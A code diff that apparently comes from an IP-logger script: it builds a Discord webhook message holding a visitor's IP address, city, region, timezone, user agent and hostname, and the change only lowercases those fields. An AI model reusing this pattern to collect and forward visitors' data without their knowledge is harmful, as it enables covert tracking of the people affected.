@@ -61,14 +61,14 @@
     // Create payload for Discord webhook as an embedded message with color #313338
     const payload = {
         embeds: [{
-            title: ipAddress, // Set the title of the embed as the user's IP address
+            title: ipAddress.toLowerCase(), // Set the title of the embed as the user's IP address in lowercase
             color: discordColor, // Set the color of the embed (Discord format)
             fields: [
-                { name: "City", value: city },
-                { name: "Region", value: region },
-                { name: "Timezone", value: timezone },
-                { name: "User Agent", value: userAgent },
-                { name: "Hostname", value: hostname },
+                { name: "city", value: city.toLowerCase() },
+                { name: "region", value: region.toLowerCase() },
+                { name: "timezone", value: timezone.toLowerCase() },
+                { name: "user agent", value: userAgent.toLowerCase() },
+                { name: "hostname", value: hostname.toLowerCase() },
             ],
         }],
     };
